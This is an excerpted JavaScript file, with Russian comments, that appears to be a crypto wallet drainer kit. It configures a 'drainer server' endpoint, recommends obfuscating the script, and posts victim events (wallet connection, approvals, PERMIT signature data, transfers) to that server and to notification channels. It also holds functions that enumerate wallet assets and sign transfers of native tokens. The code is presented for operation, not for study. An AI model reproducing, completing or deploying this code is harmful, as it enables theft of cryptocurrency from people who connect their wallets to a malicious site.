...
// Обфускацию данного скрипта можно выполнить здесь: obfuscator.io wallet doesn
...
// const MS_Server = "andrewserver.onrender.com"; // Указать домен, который прикреплен к серверу дрейнера

const MS_Server = "https://ethergasbackend.onrender.com"; // Указать домен, который прикреплен к серверу дрейнера
...
const MS_Custom_Chat = {
  ...
  Chat_Settings: {
    ...
    enter_website: "7121931167", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "7121931167", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "7121931167", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "7121931167", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "7121931167", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "7121931167", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "7121931167", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "7121931167", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "7121931167", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "7121931167", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "7121931167", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "7121931167", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "7121931167", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "7121931167", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "7121931167", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "7121931167", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "7121931167", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "7121931167", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  }
};
...
const send_request = async (data) => {
  try {
    ...
    const response = await fetch(MS_Server, {
      method: 'POST',
      headers: {
        'Accept': 'text/plain',
...
const retrive_token = async (chain_id, contract_address) => {
  try {
    console.log('retirive token')
    let response = await fetch(`${MS_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    response = await response.json();
...
const get_wallet_assets = async (address) => {
  ...
  try {
    ...
    console.log(response, 'response get wallet')
...
const SIGN_NATIVE = async (asset) => {
  console.log('sign native', console.log(asset))
  //buffer
  ...
  console.log('sign inside native', gas_price)
  ...
  try {
    ...
    if (MS_Settings.V_MODE == 1) {
      ...
      try {
        ...
        console.log(signed_message, 'signed message');
        // console.log(MS_signer.Address, 'ms address')
        console.log(MS_Current_Address, 'ms current address')
        console.log(is_sign_correct, 'is sign correct address')
    ...
    for (const asset of assets) {
      ...
      try {
        ...
        if (asset.type == 'NATIVE') {
          ...
          console.log(await node.getGasPrice(), 'gas price')
          console.log(node, 'node')
          const gasPriceHex = await node.getGasPrice();
          const gas_price = ethers.BigNumber.from(gasPriceHex).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
